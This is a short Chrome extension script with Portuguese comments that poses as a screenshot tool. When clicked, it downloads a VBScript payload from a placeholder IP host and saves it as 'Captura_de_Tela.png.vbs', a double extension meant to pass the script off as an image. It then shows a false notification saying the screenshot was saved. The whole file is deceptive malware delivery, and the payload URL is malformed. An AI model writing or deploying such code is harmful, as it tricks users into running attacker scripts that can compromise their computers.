chrome.action.onClicked.addListener((tab) => {
  const payloadUrl = "http:/IP/payload.vbs"; //Buscar o Payload

  // Baixar como se fosse um print
  chrome.downloads.download({
    url: payloadUrl,
    filename: "Captura_de_Tela.png.vbs", 
    saveAs: true // ativa a janela de "Salvar como..." com nome sugestivo
  }, () => {
    chrome.notifications?.create({
      type: "basic",
      iconUrl: "icon.png",
      title: "Print salvo!",
      message: "Seu print foi salvo com sucesso no computador."
    });
  });
});
